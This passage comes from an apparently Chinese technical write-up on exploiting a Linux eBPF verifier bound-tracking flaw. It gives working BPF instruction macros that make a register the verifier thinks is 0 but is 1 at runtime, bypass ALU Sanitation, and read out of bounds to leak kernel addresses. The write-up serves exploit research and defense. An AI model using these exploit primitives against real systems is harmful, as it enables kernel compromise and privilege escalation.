title="一、构造边界值为 [1, 0] 的寄存器"></a>一、构造边界值为 [1, 0] 的寄存器</h2><p><strong>第一步还是先利用漏洞构造一个最小边界值为 1、最大边界值为 0 的寄存器</strong>，因为 R1~R5 有的时候要用来作为函数参数，所以这里我们改为在 <code>R6</code> 上继续构造</p><p>因为读取 map 的操作代码行数太长了（），所以笔者现在给他封装到一个 <code>BPF_READ_ARRAY_MAP_IDX()</code> 宏里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> VULN_REG BPF_REG_6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* get a pointer to bpf_array */</span>                \</span><br><span class="hljs-meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span><br><span class="hljs-meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span><br><span class="hljs-meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="hljs-meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* mov the result back and clear R0 */</span>          \</span><br><span class="hljs-meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span><br></code></pre></td></tr></table></figure><h2 id="二、构造运行时为-1、verifier-确信为-0-的寄存器"><a href="#二、构造运行时为-1、verifier-确信为-0-的寄存器" class="headerlink" title="二、构造运行时为 1、verifier 确信为 0 的寄存器"></a>二、构造运行时为 1、verifier 确信为 0 的寄存器</h2><p>我们还是考虑继续在 32 位上做文章，假如我们构造出另一个 32 位边界值为 <code>[0, 1]</code> 、32位运行时值为 <code>0</code> 寄存器 <code>R7</code>，将这个寄存器与我们的 <code>R6</code> 相加，其边界值计算其实就是检查是否有溢出然后简单的把两个寄存器边界相加：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar32_min_max_add</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br>s32 smin_val = src_reg-&gt;s32_min_value;<br>s32 smax_val = src_reg-&gt;s32_max_value;<br>u32 umin_val = src_reg-&gt;u32_min_value;<br>u32 umax_val = src_reg-&gt;u32_max_value;<br><br><span class="hljs-keyword">if</span> (signed_add32_overflows(dst_reg-&gt;s32_min_value, smin_val) ||<br>    signed_add32_overflows(dst_reg-&gt;s32_max_value, smax_val)) &#123;<br>dst_reg-&gt;s32_min_value = S32_MIN;<br>dst_reg-&gt;s32_max_value = S32_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dst_reg-&gt;s32_min_value += smin_val;<br>dst_reg-&gt;s32_max_value += smax_val;<br>&#125;<br><span class="hljs-keyword">if</span> (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||<br>    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) &#123;<br>dst_reg-&gt;u32_min_value = <span class="hljs-number">0</span>;<br>dst_reg-&gt;u32_max_value = U32_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dst_reg-&gt;u32_min_value += umin_val;<br>dst_reg-&gt;u32_max_value += umax_val;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时我们的寄存器 <code>R6</code> 32位边界值为 <code>[1, 1]</code>，之后 verifier 会调用 <code>__reg_bound_offset()</code> 反向赋值给 <code>var_off</code>，此时我们的 <code>var_off</code> 的 32 位值便为 <code>1</code>，但实际上的 32 位值为 0，我们便获得了一个<strong>运行时为 0 、verifier 认为是 1 的寄存器</strong></p><p><img src="https://s2.loli.net/2023/06/03/C3PqmrvoNpFXJVc.png" alt="R6 += R7"></p><p>这样一个寄存器好像对我们来说没有太多作用，但如果我们再给 <code>R6</code> 加上 <code>1</code> ，从而使得 32 位 <code>var_off</code> 变为 <code>2</code>，<strong>但实际上的 32 位值为 1</strong>，我们再将 <code>R6</code> 与 <code>1</code> 做 <code>&amp;</code> 运算，<strong>verifier 便会认为该寄存器的值变为 0，但其实际上的运行时值为 1</strong></p><p><img src="https://s2.loli.net/2023/06/03/shRKgi38zScMfOe.png" alt="R6 += 1"></p><p><img src="https://s2.loli.net/2023/06/03/UBW2qvyrlsVax4I.png" alt="verifier:0, runtime:1"></p><p>有了这样一个寄存器，后面我们就可以开始为所欲为了：）</p><p>对于 <code>R7</code> 的构造，我们可以先从 map 中取值获取一个 verifier 全不可知的寄存器，之后利用 32 位判断跳转指令 <code>BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2)</code> 使其变为 <code>&#123; .var_off = 0, .mask = 0xffffffff00000001&#125;</code> 即可，map 中的值是我们可控的所以我们可以使其运行时值为 0 ：</p><blockquote><p>注：你也可以先给 R6 +&#x3D; 1 再 R6 &amp;&#x3D; R7，效果是一样的</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br></code></pre></td></tr></table></figure><blockquote><p>可能大家会想到对于条件跳转指令而言 verifier 主要根据边界值进行判断，或许我们能够构造一个运行时为真但 verifier 认为假的条件跳转语句（例如 <code>BPF_JMP32_IMM(BPF_JGE, BPF_REG_6, 1, 1)</code>）并在 verifier 认为恒为假但运行时为真的分支中隐藏恶意指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">is_branch32_taken</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u32 val, u8 opcode)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">subreg</span> =</span> tnum_subreg(reg-&gt;var_off);<br>s32 sval = (s32)val;<br><br><span class="hljs-keyword">switch</span> (opcode) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_JGE:<br><span class="hljs-keyword">if</span> (reg-&gt;u32_min_value &gt;= val)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (reg-&gt;u32_max_value &lt; val)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>但这并不是一个可行的方案，因为对于不可达指令（dead code），<strong>verifier会将其 patch 为跳转回条件分支指令</strong>，从而导致我们无法在此处藏入恶意代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sanitize_dead_code</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn_aux_data</span> *<span class="hljs-title">aux_data</span> =</span> env-&gt;insn_aux_data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">trap</span> =</span> BPF_JMP_IMM(BPF_JA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">insn</span> =</span> env-&gt;prog-&gt;insnsi;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> insn_cnt = env-&gt;prog-&gt;len;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++) &#123;<br><span class="hljs-keyword">if</span> (aux_data[i].seen)<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-built_in">memcpy</span>(insn + i, &amp;trap, <span class="hljs-keyword">sizeof</span>(trap));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="三、内核地址泄露"><a href="#三、内核地址泄露" class="headerlink" title="三、内核地址泄露"></a>三、内核地址泄露</h2><p>接下来我们考虑如何泄露内核地址，比较容易想到的是我们或许可以通过这个运行时为 1 而 verifier 认为是 0 的寄存器构造一些越界读取，而 map 是我们能够直接接触到的指针之一，因此我们可以尝试从此处下手</p><p>我们是否可以直接向  <code>BPF_FUNC_map_lookup_elem()</code>  传入一个 verifier 确信为 0 但实际上是负数的寄存器呢？<strong>答案是否定的</strong>，因为对于 <code>BPF_MAP_TYPE_ARRAY</code> 类型的 map 而言在查找元素时实际上会调用到 <code>array_map_lookup_elem()</code> ，其 index 为无符号类型，因此我们无法前向读取：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Called from syscall or from eBPF program */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">array_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *key)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> =</span> container_of(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_array, <span class="hljs-built_in">map</span>);<br>u32 index = *(u32 *)key;<br><br><span class="hljs-keyword">if</span> (unlikely(index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">array</span>-&gt;value + <span class="hljs-built_in">array</span>-&gt;elem_size * (index &amp; <span class="hljs-built_in">array</span>-&gt;index_mask);<br>&#125;<br></code></pre></td></tr></table></figure><p>但当我们在 eBPF 程序中调用 <code>BPF_FUNC_map_lookup_elem()</code>  时，其返回值为指向 <code>value</code> 的指针，而<strong>这个指针是允许与常量做运算的</strong>（类型为 <code>PTR_TO_MAP_VALUE</code> ），由于我们有一个 verifier 认为是 0 的寄存器，我们可以轻松绕过对指针范围的检查并完成越界读取……吗？</p><h3 id="ALU-Sanitation-bypass"><a href="#ALU-Sanitation-bypass" class="headerlink" title="ALU Sanitation bypass"></a>ALU Sanitation bypass</h3><p><code>ALU Sanitation</code> 是一个用于<strong>运行时动态检测</strong>的功能，通过对程序正在处理的实际值进行运行时检查以弥补 verifier 静态分析的不足，这项技术通过调用 <code>fixup_bpf_calls()</code> <strong>为 eBPF 程序中的每一条指令的前面都添加上额外的辅助指令</strong>来实现</p><p>对于 <code>BPF_ADD</code> 及 <code>BPF_SUB</code> 这样的指令而言，会添加如下辅助指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fixup_bpf_calls</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++, insn++) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (insn-&gt;code == (BPF_ALU64 | BPF_ADD | BPF_X) ||<br>    insn-&gt;code == (BPF_ALU64 | BPF_SUB | BPF_X)) &#123;<br><span class="hljs-type">const</span> u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;<br><span class="hljs-type">const</span> u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">insn_buf</span>[16];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">patch</span> =</span> &amp;insn_buf[<span class="hljs-number">0</span>];<br><span class="hljs-type">bool</span> issrc, isneg;<br>u32 off_reg;<br><br>aux = &amp;env-&gt;insn_aux_data[i + delta];<br><span class="hljs-keyword">if</span> (!aux-&gt;alu_state ||<br>    aux-&gt;alu_state == BPF_ALU_NON_POINTER)<br><span class="hljs-keyword">continue</span>;<br><br>isneg = aux-&gt;alu_state &amp; BPF_ALU_NEG_VALUE;<br>issrc = (aux-&gt;alu_state &amp; BPF_ALU_SANITIZE) ==<br>BPF_ALU_SANITIZE_SRC;<br><br>off_reg = issrc ? insn-&gt;src_reg : insn-&gt;dst_reg;<br><span class="hljs-keyword">if</span> (isneg)<br>*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, <span class="hljs-number">-1</span>);<br>*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit - <span class="hljs-number">1</span>);<br>*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);<br>*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);<br>*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="hljs-number">0</span>);<br>*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="hljs-number">63</span>);<br><span class="hljs-keyword">if</span> (issrc) &#123;<br>*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,<br> off_reg);<br>insn-&gt;src_reg = BPF_REG_AX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>*patch++ = BPF_ALU64_REG(BPF_AND, off_reg,<br> BPF_REG_AX);<br>&#125;<br><span class="hljs-keyword">if</span> (isneg)<br>insn-&gt;code = insn-&gt;code == code_add ?<br>     code_sub : code_add;<br>*patch++ = *insn;<br><span class="hljs-keyword">if</span> (issrc &amp;&amp; isneg)<br>*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, <span class="hljs-number">-1</span>);<br>cnt = patch - insn_buf;<br><br>new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);<br><span class="hljs-keyword">if</span> (!new_prog)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>delta    += cnt - <span class="hljs-number">1</span>;<br>env-&gt;prog = prog = new_prog;<br>insn      = new_prog-&gt;insnsi + i + delta;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>aux-&gt;alu_limit</code> 为<strong>当前指针运算范围</strong>，初始时为 0，与指针所做的常量运算同步，对于减法而言可读范围为 <code>(ptr - alu_limit, ptr]</code> （以指针最初指向的地址为 <code>0</code>），因此我们还需要绕过这个检查</p><p>由于我们有运行时为 1、verifier 认为是 0 的寄存器，我们可以这样调整范围：</p><ul><li>构造另外一个同样是运行时值为 1、verifier 认为是 0 的寄存器 <code>R8</code></li><li>将 <code>R8</code> 乘上一个不大于 value size 的值（例如 value size 为 <code>0x1000</code>，<code>R8</code> 便设为 <code>0x1000</code>）</li><li>将指向 map 第一个元素第一个字节 <code>value[0]</code> 的寄存器（假设为 <code>R7</code> ）先加上 <code>0x1000</code>，此时 <code>alu_limit</code> 变为 <code>0x1000</code>，<code>R7</code> 指向 <code>value[0x1000]</code></li><li><code>R7 -= R8</code>，由于 verifier 认为 R8 为 0，因此 <code>alu_limit</code> 保持不变，<strong>但 R7 实际上已经指回了</strong> <code>value[0]</code></li></ul><p>由此我们便能继续愉快地进行前向的越界读了</p><blockquote><p>注：在内核版本 5.11.8 之前 ALU Sanitation 存在一个漏洞，即 <code>aux_alu_limit</code> 被初始化为 0 从而导致 <code>0-1</code> 造成整型溢出变为一个巨大的值，在<a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899">这个 commit</a> 中才被修复，因此对于 5.11.8 之前版本的内核而言是不需要绕过该检查的</p></blockquote><h3 id="OOB-read-on-bpf-array"><a href="#OOB-read-on-bpf-array" class="headerlink" title="OOB-read on bpf_array"></a>OOB-read on bpf_array</h3><p>现在让我们来看看这个存放数据的位置附近有没有什么有趣的数据，对于 <code>BPF_MAP_TYPE_ARRAY</code> 类型 的 map 而言，其 wrapper 为 <code>bpf_array</code> 类型（即 <code>bpf_map</code> 内嵌于该结构体中），<strong>数据则直接存放在其内部的</strong> <code>value</code> <strong>数组成员当中</strong>，因此在查找元素时我们获得的其实是一个指向 <code>bpf_array</code> 内部的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> <span class="hljs-title">map</span>;</span><br>u32 elem_size;<br>u32 index_mask;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array_aux</span> *<span class="hljs-title">aux</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>DECLARE_FLEX_ARRAY(<span class="hljs-type">char</span>, value) __aligned(<span class="hljs-number">8</span>);<br>DECLARE_FLEX_ARRAY(<span class="hljs-type">void</span> *, ptrs) __aligned(<span class="hljs-number">8</span>);<br>DECLARE_FLEX_ARRAY(<span class="hljs-type">void</span> __percpu *, pptrs) __aligned(<span class="hljs-number">8</span>);<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>因此我们只需要前向读取便能读取到 <code>bpf_map</code>，之后通过 <code>bpf_map</code> 的函数表（<code>bpf_map-&gt;ops</code> ）便能泄露出内核地址，这里我们将 <code>bpf_array_ops</code> 的值读取到 <code>map[1]</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_KERNEL_INFO(__map_fd)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br></code></pre></td></tr></table></figure><p>成功泄露出内核地址：</p><p><img src="https://s2.loli.net/2023/06/04/zE4t6RO8acsMbJV.png" alt="image.png"></p><blockquote><p>笔者本来想直接写一个循环直接往前盲读 <code>page_offset_base + 0x9d000</code> （通过物理地址 0 处数据定位），但是  <em>verifier 要求不能有回向边</em>  ，所以这里还是老老实实地看 <code>bpf_array</code> 周围的数据：）</p></blockquote><h3 id="Leak-map-address"><a href="#Leak-map-address" class="headerlink" title="Leak map address"></a>Leak map address</h3><p>当我们在调用辅助函数 <code>BPF_FUNC_map_lookup_elem()</code> 时，该函数会返回一个指向 <code>value</code> 的指针，我们是否能够直接将这个值存放到 map 当中从而泄露出 map 地址？通常情况下答案是否定的，verifier 会检查寄存器的类型并阻止指针泄露的情况发生</p><p>现在让我们思考如何利用我们的漏洞寄存器绕过这个限制，注意到 verifier 在跟踪指针寄存器与常量寄存器间运算时会调用到 <code>adjust_ptr_min_max_vals()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_reg_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> bpf_insn *insn)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_verifier_state</span> *<span class="hljs-title">vstate</span> =</span> env-&gt;cur_state;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_state</span> *<span class="hljs-title">state</span> =</span> vstate-&gt;frame[vstate-&gt;curframe];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> state-&gt;regs, *dst_reg, *src_reg;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">ptr_reg</span> =</span> <span class="hljs-literal">NULL</span>, off_reg = &#123;<span class="hljs-number">0</span>&#125;;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-type">int</span> err;<br><br>dst_reg = &amp;regs[insn-&gt;dst_reg];<br>src_reg = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (dst_reg-&gt;type != SCALAR_VALUE)<br>ptr_reg = dst_reg;<br><span class="hljs-keyword">else</span><br><span class="hljs-comment">/* Make sure ID is cleared otherwise dst_reg min/max could be</span><br><span 